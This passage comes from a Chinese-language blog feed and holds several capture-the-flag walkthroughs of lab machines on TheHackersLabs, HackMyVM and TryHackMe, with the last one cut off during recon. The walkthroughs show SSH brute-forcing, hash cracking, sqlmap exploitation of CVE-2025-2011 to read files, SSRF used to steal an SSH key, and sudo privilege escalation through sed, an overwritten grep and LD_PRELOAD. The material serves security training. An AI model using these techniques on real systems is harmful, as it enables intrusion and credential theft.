192.168.56.87\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-14 21:50 CST\nNmap scan report for 192.168.56.87\nHost is up (0.00040s latency).\n\nPORT      STATE SERVICE VERSION\n65535/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)\n| ssh-hostkey: \n|   256 32:ca:e5:d1:12:c2:1e:11:1e:58:43:32:a0:dc:03:ab (ECDSA)\n|_  256 79:3a:80:50:61:d9:96:34:e2:db:d6:1e:65:f0:a9:14 (ED25519)\nMAC Address: 08:00:27:8B:04:C6 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose|router\nRunning: Linux 4.X|5.X, MikroTik RouterOS 7.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3\nOS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.41 ms 192.168.56.87\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 15.32 seconds\n```\n\nOhya？SSH，`hydra`爆破一下用户名\n\n```bash\nhydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt  -p elbunkermolagollon123 -t 12 -s 65535 -Vv 192.168.56.87 ssh  \n```\n\n得到用户名 `cowboy`\n\n![image.png](/post-images/TheHackersLabsSedition/image3.png)\n\n## 权限提升\n\n### In cowboy shell\n\n查看`sudo`权限\n\n```bash\ncowboy@Sedition:~$ sudo -l\n[sudo] contraseña para cowboy: \nSorry, user cowboy may not run sudo on sedition.\n```\n\n寻找`sid`权限文件\n\n```bash\ncowboy@Sedition:~$ find / -perm -u=s -type f 2>/dev/null\n/usr/lib/openssh/ssh-keysign\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/bin/passwd\n/usr/bin/sudo\n/usr/bin/chsh\n/usr/bin/umount\n/usr/bin/chfn\n/usr/bin/su\n/usr/bin/newgrp\n/usr/bin/gpasswd\n/usr/bin/mount\n```\n\n突然注意到`.bash_history` 没有被重定向到 `/dev/null`\n\n```bash\ncowboy@Sedition:~$ ls -al\ntotal 24\ndrwx------ 2 cowboy cowboy 4096 jul  6 20:08 .\ndrwxr-xr-x 4 root   root   4096 jul  6 18:56 ..\n-rw------- 1 cowboy cowboy   78 jul 14 16:09 .bash_history\n-rw-r--r-- 1 cowboy cowboy  220 jul  6 18:56 .bash_logout\n-rw-r--r-- 1 cowboy cowboy 3526 jul  6 18:56 .bashrc\n-rw-r--r-- 1 cowboy cowboy  807 jul  6 18:56 .profile\ncowboy@Sedition:~$ cat .bash_history \nhistory\nexit\nmariadb\nmariadb -u cowboy -pelbunkermolagollon123\nsu debian\nexit\n```\n\n扒拉 `users` 表\n\n```bash\nMariaDB [bunker]> select * from users;\n+--------+----------------------------------+\n| user   | password                         |\n+--------+----------------------------------+\n| debian | 7c6a180b36896a0a8c02787eeafb0e4c |\n+--------+----------------------------------+\n1 row in set (0,000 sec)\n```\n\n爆破密码\n\n```bash\n➜  Sedition john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 hash \nUsing default input encoding: UTF-8\nLoaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])\nWarning: no OpenMP support for this hash type, consider --fork=8\nPress 'q' or Ctrl-C to abort, almost any other key for status\npassword1        (?)     \n1g 0:00:00:00 DONE (2025-07-14 22:17) 100.0g/s 38400p/s 38400c/s 38400C/s 123456..michael1\nUse the \"--show --format=Raw-MD5\" options to display all of the cracked passwords reliably\nSession completed. \n```\n\n### In debian shell\n\n当前用户家目录下能拿到 `user.txt`\n\n```bash\ndebian@Sedition:~$ cat flag.txt \npixxxxxxxxxxxxxxxxxxxxxx\n```\n\n`sudo` 权限\n\n```bash\ndebian@Sedition:~$ sudo -l\nMatching Defaults entries for debian on sedition:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty\n\nUser debian may run the following commands on sedition:\n    (ALL) NOPASSWD: /usr/bin/sed\n```\n\n结束：https://gtfobins.github.io/gtfobins/sed/\n\n![image.png](/post-images/TheHackersLabsSedition/image4.png)\n\n读取 `root.txt`\n\n```bash\n# cat root.txt\nlaxxxxxxxxxxxxxxxxxxxxxxxxxx\n```\n\n## 总结\n\n超级常规",
            "url": "https://www.sunsetaction.top/2025/07/14/TheHackersLabsSedition",
            "title": "TheHackersLabs - Sedition",
            "summary": "Sedition https://labs.thehackerslabs.com/machine/117 Recon 扫描出来是非常规端口 没有Web端口，我们只能从SMB上手 首先尝试使用匿名账户进行访问 backup里面有一个压缩包，下载 ZIP Crack 解压压缩包需要密码 john转换后爆...",
            "date_modified": "2025-07-14T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "靶机",
                "TheHackersLabs",
                "Linux",
                "SMB",
                "ZIPcrack",
                "sed"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/07/14/HackMyVMXimai",
            "content_html": "\n# Ximai\n\n> https://hackmyvm.eu/machines/machine.php?vm=Ximai\n> \n\nNotes：**More than one path to initial access.**\n\n![image.png](/post-images/HackMyVMXimai/image.png)\n\nPS: 靶机的文件夹名字是`Ximai`，不是`Ximia`，做的时候打错了。\n\n## Recon\n\n```bash\n➜  Ximia nmap -sT -min-rate 10000 192.168.56.62 \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-13 20:32 CST\nNmap scan report for 192.168.56.62\nHost is up (0.0012s latency).\nNot shown: 996 closed tcp ports (conn-refused)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n3306/tcp open  mysql\n8000/tcp open  http-alt\nMAC Address: 08:00:27:91:AC:2B (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 13.50 seconds\n```\n\n```bash\n➜  Ximia nmap -sT -A -p 22,80,3306,8000 192.168.56.62\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-13 20:33 CST\nNmap scan report for 192.168.56.62\nHost is up (0.0036s latency).\n\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)\n| ssh-hostkey: \n|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)\n|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)\n|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)\n80/tcp   open  http    Apache httpd 2.4.62 ((Debian))\n|_http-server-header: Apache/2.4.62 (Debian)\n|_http-title: Apache2 Ubuntu Default Page: It works\n3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)\n8000/tcp open  http    Apache httpd 2.4.62 ((Debian))\n|_http-title: NeonGrid Solutions\n|_http-open-proxy: Proxy might be redirecting requests\n|_http-generator: WordPress 6.8.1\n|_http-server-header: Apache/2.4.62 (Debian)\nMAC Address: 08:00:27:91:AC:2B (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose|router\nRunning: Linux 4.X|5.X, MikroTik RouterOS 7.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3\nOS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   3.57 ms 192.168.56.62\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 36.01 seconds\n```\n\n访问 `HTTP` ，`80`端口是默认页面\n\n![image.png](/post-images/HackMyVMXimai/image1.png)\n\n`8080`端口是`wordpress`，并且给出了一个信息\n\n![image.png](/post-images/HackMyVMXimai/image2.png)\n\n信息是：\n\n![image.png](/post-images/HackMyVMXimai/image3.png)\n\n`80`端口扫描一下目录，`8000`端口直接上`WPScan`\n\n```bash\n➜  Ximia feroxbuster --url http://192.168.56.62 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --filter-status 404,503 -x php,zip,txt\n\n ___  ___  __   __     __      __         __   ___\n|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__\n|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___\nby Ben \"epi\" Risher 🤓                 ver: 2.11.0\n───────────────────────────┬──────────────────────\n 🎯  Target Url            │ http://192.168.56.62\n 🚀  Threads               │ 50\n 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n 💢  Status Code Filters   │ [404, 503]\n 💥  Timeout (secs)        │ 7\n 🦡  User-Agent            │ feroxbuster/2.11.0\n 💉  Config File           │ /etc/feroxbuster/ferox-config.toml\n 🔎  Extract Links         │ true\n 💲  Extensions            │ [php, zip, txt]\n 🏁  HTTP methods          │ [GET]\n 🔃  Recursion Depth       │ 4\n───────────────────────────┴──────────────────────\n 🏁  Press [ENTER] to use the Scan Management Menu™\n──────────────────────────────────────────────────\n404      GET        9l       31w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n403      GET        9l       28w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n200      GET     1022l     5262w    85827c http://192.168.56.62/info.php\n[>-------------------] - 1s      1233/882208  39m     found:1       errors:2      \n[>-------------------] - 1s      1148/882180  840/s   http://192.168.56.62/                \n200      GET      376l      965w    10938c http://192.168.56.62/\n200      GET       37l      185w    19268c http://192.168.56.62/that-place-where-i-put-that-thing-that-time/1b260614-3aff-11f0-ac81-000c2921b441.jpg\n200      GET        4l       31w      167c http://192.168.56.62/that-place-where-i-put-that-thing-that-time/creds.txt\n[####################] - 6m    882228/882228  0s      found:5       errors:2      \n[####################] - 6m    882180/882180  2628/s  http://192.168.56.62/ \n[####################] - 0s    882180/882180  32673333/s http://192.168.56.62/that-place-where-i-put-that-thing-that-time/ => Directory listing (add --scan-dir-listings to scan)  \n```\n\n下面是`80`端口中扫描出来的页面\n\n![image.png](/post-images/HackMyVMXimai/image4.png)\n\n(?说我吗😭)\n\n![image.png](/post-images/HackMyVMXimai/image5.png)\n\n这个`creds.txt`可能还有点用，因为`mysqli.allow_local_infile`也开启着，可以通过数据库去读\n\n![image.png](/post-images/HackMyVMXimai/image6.png)\n\n接下来看`Wpscan` 的结果，扫描到存在 `SQL`注入，`CVE-2025-2011`\n\n![image.png](/post-images/HackMyVMXimai/image7.png)\n\n## CVE-2025-2011\n\nPOC：https://github.com/datagoboom/CVE-2025-2011\n\n但是这里通过`POC`无法进行利用\n\n![image.png](/post-images/HackMyVMXimai/image8.png)\n\n我们观察`POC`，尝试使用`SQLmap`来扫\n\n![image.png](/post-images/HackMyVMXimai/image9.png)\n\n```bash\nsqlmap -u \"http://wordpress.local:8000/wp-admin/admin-ajax.php?s=test*&perpage=20&page=1&orderBy=source_id&dateEnd=&dateStart=&order=DESC&sources=&action=depicter-lead-index\" -batch  \n```\n\n![image.png](/post-images/HackMyVMXimai/image10.png)\n\n这样就可以扫描出来了，我们根据前面的线索来直接读取文件 `/etc/jimmy.txt`\n\n```bash\nsqlmap -u \"http://wordpress.local:8000/wp-admin/admin-ajax.php?s=test*&perpage=20&page=1&orderBy=source_id&dateEnd=&dateStart=&order=DESC&sources=&action=depicter-lead-index\" -batch --file-read /etc/jimmy.txt\n```\n\n```bash\n➜  files cat _etc_jimmy.txt \nHandsomeHU\n```\n\n`ssh` 登录\n\n![image.png](/post-images/HackMyVMXimai/image11.png)\n\n## 权限提升\n\n当头一棒\n\n```bash\njimmy@Ximai:~$ ls\nsorry, you are restricted from using this command.\n```\n\n查看环境变量\n\n```bash\njimmy@Ximai:~$ echo $PATH\n./...\n```\n\n直接恢复一下环境变量就行了\n\n```bash\njimmy@Ximai:~$ export PATH=\"/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin\"\n```\n\n当前目录下能读取`user.txt`\n\n```bash\njimmy@Ximai:~$ cat us3r.txt \nflag{user-ffbea0a7-3b01-11f0-9160-000c2921b441}\n```\n\n查看`sudo`权限\n\n```bash\njimmy@Ximai:~$ sudo -l\n\nWe trust you have received the usual lecture from the local System\nAdministrator. It usually boils down to these three things:\n\n    #1) Respect the privacy of others.\n    #2) Think before you type.\n    #3) With great power comes great responsibility.\n\n[sudo] password for jimmy: \nSorry, user jimmy may not run sudo on Ximai.\n```\n\n查看`wp-config.php`\n\n```bash\n/** Database username */\ndefine( 'DB_USER', 'root' );       \n                                                                                                \n/** Database password */                                                                        \ndefine( 'DB_PASSWORD', 'SuperSecret' ); \n```\n\n数据库表信息\n\n```bash\nMariaDB [wordpress]> select * from wp_users;\n+----+------------+-----------------------------------------------------------------+---------------+-----------------+----------+---------------------+---------------------+-------------+--------------+\n| ID | user_login | user_pass                                                       | user_nicename | user_email      | user_url | user_registered     | user_activation_key | user_status | display_name |\n+----+------------+-----------------------------------------------------------------+---------------+-----------------+----------+---------------------+---------------------+-------------+--------------+\n|  1 | adminer    | $wp$2y$10$ylcSQukwQZAMcFcQTmFzVuJhcr6CoEflSJs6pSiA9OG0JWOpAEYVq | adminer       | no@thankyou.com |          | 2025-05-28 10:35:26 |                     |           0 | adminer      |\n+----+------------+-----------------------------------------------------------------+---------------+-----------------+----------+---------------------+---------------------+-------------+--------------+\n1 row in set (0.000 sec)\n```\n\n尝试密码爆破，这里使用`rockyou`无法爆破出来，太慢了\n\n```bash\n➜  Ximia john --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt hash\nUsing default input encoding: UTF-8\nLoaded 1 password hash (bcrypt [Blowfish 32/64 X3])\nCost 1 (iteration count) is 1024 for all loaded hashes\nWill run 8 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\n```\n\n使用`cupp`生成弱密码字典进行尝试\n\n![image.png](/post-images/HackMyVMXimai/image12.png)\n\n也不能破解，我们通过`top 100`加上用户名制作字典\n\n```bash\n➜  Ximia cat /usr/share/seclists/Passwords/xato-net-10-million-passwords-100.txt | awk '{print \"adminer\"$1}' > maybe.txt\n```\n\n得到密码 `adminer123456`\n\n![image.png](/post-images/HackMyVMXimai/image13.png)\n\n查看 `sudo` 权限\n\n```bash\nadminer@Ximai:~$ sudo -l\nMatching Defaults entries for adminer on Ximai:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser adminer may run the following commands on Ximai:\n    (ALL) NOPASSWD: /usr/bin/grep\n```\n\n```bash\nadminer@Ximai:~$ sudo /usr/bin/grep \nsorry, you are restricted from using this command.try egrep instead.\n```\n\n666字符串\n\n```bash\nadminer@Ximai:~$ cat /usr/bin/grep\necho 'sorry, you are restricted from using this command.try egrep instead.'\n```\n\n查看权限，有写入权限\n\n```bash\nadminer@Ximai:~$ ls -al /usr/bin/grep\n-rwxr-xrwx 1 root root 76 May 28 09:06 /usr/bin/grep\n```\n\n直接梭哈\n\n```bash\nadminer@Ximai:~$ cat /bin/bash > /usr/bin/grep\nadminer@Ximai:~$ sudo grep\nroot@Ximai:/home/adminer# \n```\n\n读取 `root.txt`\n\n```bash\nroot@Ximai:~# cat r00t.txt \nflag{root-126e5653-3b02-11f0-b074-000c2921b441}\n```",
            "url": "https://www.sunsetaction.top/2025/07/14/HackMyVMXimai",
            "title": "HackMyVM - Ximai",
            "summary": "Ximai https://hackmyvm.eu/machines/machine.php?vm=Ximai Notes：More than one path to initial access. PS: 靶机的文件夹名字是Ximai，不是Ximia，做的时候打错了。 Recon 访问 HTTP ...",
            "date_modified": "2025-07-14T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "靶机",
                "HackMyVM",
                "Linux",
                "WordPress",
                "CVE-2025-2011",
                "Password_generator"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/07/05/TryHackMeCreative",
            "content_html": "\n# Creative\n\n> https://tryhackme.com/room/creative | `Easy`\n> \n\ninfo：Exploit a vulnerable web application and some misconfigurations to gain root privileges.\n\n![image.png](/post-images/TryHackMeCreative/image.png)\n\n## Recon\n\n```bash\n➜  Creative nmap -sT -min-rate 10000 10.10.96.159             \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-05 22:02 CST\nNmap scan report for 10.10.96.159\nHost is up (0.35s latency).\nNot shown: 998 filtered tcp ports (no-response)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\nNmap done: 1 IP address (1 host up) scanned in 2.65 seconds\n```\n\n```bash\n➜  Creative nmap -sT -A -p 22,80 10.10.96.159                                                  \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-05 22:03 CST\nNmap scan report for 10.10.96.159\nHost is up (0.35s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 8d:ff:e3:db:ba:78:82:20:fc:2c:97:dc:21:21:7e:ad (RSA)\n|   256 89:7a:de:66:81:14:cd:ea:a8:46:a4:57:31:d8:d2:cf (ECDSA)\n|_  256 07:78:87:81:7b:69:a7:d2:8b:5d:45:79:5d:85:cd:ca (ED25519)\n80/tcp open  http    nginx 1.18.0 (Ubuntu)\n|_http-server-header: nginx/1.18.0 (Ubuntu)\n|_http-title: Did not follow redirect to http://creative.thm\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning (JUST GUESSING): Linux 4.X|2.6.X|3.X|5.X (97%)\nOS CPE: cpe:/o:linux:linux_kernel:4.15 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:5\nAggressive OS guesses: Linux 4.15 (97%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 4.15 - 5.19 (91%), Linux 5.0 - 5.14 (91%), Linux 2.6.32 - 3.10 (91%), Linux 5.4 (90%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 4 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT       ADDRESS\n1   216.65 ms 10.2.0.1\n2   ... 3\n4   343.32 ms 10.10.96.159\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 29.57 seconds\n```\n\n访问`HTTP`\n\n![image.png](/post-images/TryHackMeCreative/image1.png)\n\n经过一番搜索没法发现可以利用的，扫描一下子域名\n\n```bash\n➜  Creative ffuf -u 'http://creative.thm' -H 'host: FUZZ.creative.thm' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fs=178\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v2.1.0-dev\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://creative.thm\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt\n :: Header           : Host: FUZZ.creative.thm\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500\n :: Filter           : Response size: 178\n________________________________________________\n\nbeta                    [Status: 200, Size: 591, Words: 91, Lines: 20, Duration: 374ms]\n:: Progress: [14512/114442] :: Job [1/1] :: 117 req/sec :: Duration: [0:02:08] :: Errors: 0 ::\n```\n\n得到`beta`，访问\n\n![image.png](/post-images/TryHackMeCreative/image2.png)\n\n## SSRF\n\n看着像是`SSRF`，输入我们`IP`尝试\n\n```bash\n➜  Creative nc -lvp 80  \nlistening on [any] 80 ...\nconnect to [10.2.7.57] from creative.thm [10.10.96.159] 33820\nGET / HTTP/1.1\nHost: 10.2.7.57\nUser-Agent: python-requests/2.28.2\nAccept-Encoding: gzip, deflate\nAccept: */*\nConnection: keep-alive\n```\n\n输入`127.0.0.1`\n\n![image.png](/post-images/TryHackMeCreative/image3.png)\n\n直接爆端口\n\n```bash\n➜  Creative seq 2000 > ports\n```\n\n```bash\n➜  Creative ffuf -u 'http://beta.creative.thm' -X POST -d 'url=http://127.0.0.1:FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -w ports -fs=13\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v2.1.0-dev\n________________________________________________\n\n :: Method           : POST\n :: URL              : http://beta.creative.thm\n :: Wordlist         : FUZZ: /root/Desktop/TryHackMe/Creative/ports\n :: Header           : Content-Type: application/x-www-form-urlencoded\n :: Data             : url=http://127.0.0.1:FUZZ\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500\n :: Filter           : Response size: 13\n________________________________________________\n\n80                      [Status: 200, Size: 37589, Words: 14867, Lines: 686, Duration: 365ms]\n1337                    [Status: 200, Size: 1143, Words: 40, Lines: 39, Duration: 348ms]\n:: Progress: [2000/2000] :: Job [1/1] :: 115 req/sec :: Duration: [0:00:18] :: Errors: 0 ::\n```\n\n发现内部端口`1337` ，直接让服务器进行`SSRF`\n\n![image.png](/post-images/TryHackMeCreative/image4.png)\n\n我们再换成\n\n```bash\nhttp://127.0.0.1:1337/home\n```\n\n![image.png](/post-images/TryHackMeCreative/image5.png)\n\n我们直接读取私钥\n\n```bash\nhttp://127.0.0.1:1337/home/saad/.ssh/id_rsa\n```\n\n![image.png](/post-images/TryHackMeCreative/image6.png)\n\n## Crack\n\n直接私钥登录\n\n```bash\n➜  Creative ssh saad@10.10.96.159 -i sshkey\nEnter passphrase for key 'sshkey': \n```\n\n需要密码，爆破\n\n```bash\n➜  Creative john --wordlist=/usr/share/wordlists/rockyou.txt 1.txt\nUsing default input encoding: UTF-8\nLoaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])\nCost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes\nCost 2 (iteration count) is 16 for all loaded hashes\nWill run 8 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nsweetness        (sshkey)     \n1g 0:00:00:31 DONE (2025-07-05 22:40) 0.03192g/s 30.65p/s 30.65c/s 30.65C/s hawaii..sandy\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed. \n```\n\n我们再登录\n\n![image.png](/post-images/TryHackMeCreative/image7.png)\n\n当前用户家目录下能读取到`user.txt`\n\n```bash\nsaad@ip-10-10-96-159:~$ cat user.txt \n9a1ce90a7653d74ab98630b47b8b4a84\n```\n\n## Root\n\n看到`gnupg` 感觉是要整这个\n\n```bash\nsaad@ip-10-10-96-159:~$ ls -al\ntotal 52\ndrwxr-xr-x 7 saad saad 4096 Jan 21  2023 .\ndrwxr-xr-x 4 root root 4096 Jul  5 13:57 ..\n-rw------- 1 saad saad  362 Jan 21  2023 .bash_history\n-rw-r--r-- 1 saad saad  220 Feb 25  2020 .bash_logout\n-rw-r--r-- 1 saad saad 3797 Jan 21  2023 .bashrc\ndrwx------ 2 saad saad 4096 Jan 20  2023 .cache\ndrwx------ 3 saad saad 4096 Jan 20  2023 .gnupg\ndrwxrwxr-x 3 saad saad 4096 Jan 20  2023 .local\n-rw-r--r-- 1 saad saad  807 Feb 25  2020 .profile\ndrwx------ 3 saad saad 4096 Jan 20  2023 snap\ndrwx------ 2 saad saad 4096 Jan 21  2023 .ssh\n-rwxr-xr-x 1 root root  150 Jan 20  2023 start_server.py\n-rw-r--r-- 1 saad saad    0 Jan 20  2023 .sudo_as_admin_successful\n-rw-rw---- 1 saad saad   33 Jan 21  2023 user.txt\n```\n\n但是并不是，因为文件并不足够\n\n我们又注意到`.bash_history` 竟然没有被重合向到`/dev/null`\n\n```bash\nsaad@ip-10-10-96-159:~$ cat .bash_history \nwhoami\npwd\nls -al\nls\ncd ..\nsudo -l\necho \"saad:MyStrongestPasswordYet$4291\" > creds.txt\nrm creds.txt\nsudo -l\nwhomai\nwhoami\npwd\nls -al\nsudo -l\nls -al\npwd\nwhoami\nmysql -u root -p\nnetstat -antlp\nmysql -u root\nsudo su\nssh root@192.169.155.104\nmysql -u user -p\nmysql -u db_user -p\nls -ld /var/lib/mysql\nls -al\ncat .bash_history \ncat .bash_logout \nnano .bashrc \nls -al\n```\n\n得到密码 `MyStrongestPasswordYet$4291` ，啥看`sudo`权限\n\n```bash\nsaad@ip-10-10-96-159:~$ sudo -l\nMatching Defaults entries for saad on ip-10-10-96-159:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, env_keep+=LD_PRELOAD\n\nUser saad may run the following commands on ip-10-10-96-159:\n    (root) /usr/bin/ping\n```\n\n看到`env_keep+=LD_PRELOAD` 结束了\n\n- `LD_PRELOAD` 可以在运行程序前强行加载你自定义的 `.so` 共享库。\n- 如果这个库中实现了 `getuid()` 或其他标准函数，它就可以被优先加载、覆盖。\n- 当你以 `sudo` 运行 `/bin/whoami`，就会先加载你的库，执行你指定的恶意代码\n\n> https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html?highlight=LD_PRELOAD#ld_preload---ld_library_path\n> \n\n![image.png](/post-images/TryHackMeCreative/image8.png)\n\n`root.txt`\n\n```bash\nroot@ip-10-10-96-159:~# cat root.txt \n992bfd94b90da48634aed182aae7b99f\n```\n\n## 总结\n\n梭哈",
            "url": "https://www.sunsetaction.top/2025/07/05/TryHackMeCreative",
            "title": "TryHackMe - Creative",
            "summary": "Creative https://tryhackme.com/room/creative | Easy info：Exploit a vulnerable web application and some misconfigurations to gain root privileges. Reco...",
            "date_modified": "2025-07-05T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "靶机",
                "TryHackMe",
                "Linux",
                "SSRF",
                "SUDO"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/06/22/HackTheBoxMachine - Developer",
            "content_html": "\n# Machine - Developer\n\n> https://app.hackthebox.com/machines/Developer | `Linux` | `Hard`\n> \n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image.png)\n\n## Recon\n\n```bash\n➜  Developer nmap -sT -min-rate 5000 -p- 10.10.11.103\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-21 12:45 CST \nNmap scan report for 10.10.11.103\nHost is up (0.092s latency).\nNot shown: 59816 filtered tcp ports (no-response), 5717 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\nNmap done: 1 IP address (1 host up) scanned in 110.48 seconds\n```\n\n```bash\n➜  Developer nmap -sT -A -p 22,80 10.10.11.103       \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-21 12:48 CST\nNmap scan report for 10.10.11.103\nHost is up (0.23s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 36:aa:93:e4:a4:56:ab:39:86:66:bf:3e:09:fa:eb:e0 (RSA)\n|   256 11:fb:e9:89:2e:4b:66:40:7b:6b:01:cf:f2:f2:ee:ef (ECDSA)\n|_  256 77:56:93:6e:5f:ea:e2:ad:b0:2e:cf:23:9d:66:ed:12 (ED25519)\n80/tcp open  http    Apache httpd 2.4.41\n|_http-title: Did not follow redirect to http://developer.htb/\n|_http-server-header: Apache/2.4.41 (Ubuntu)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.19\nNetwork Distance: 2 hops\nService Info: Host: developer.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT      ADDRESS\n1   99.02 ms 10.10.16.1\n2   99.78 ms 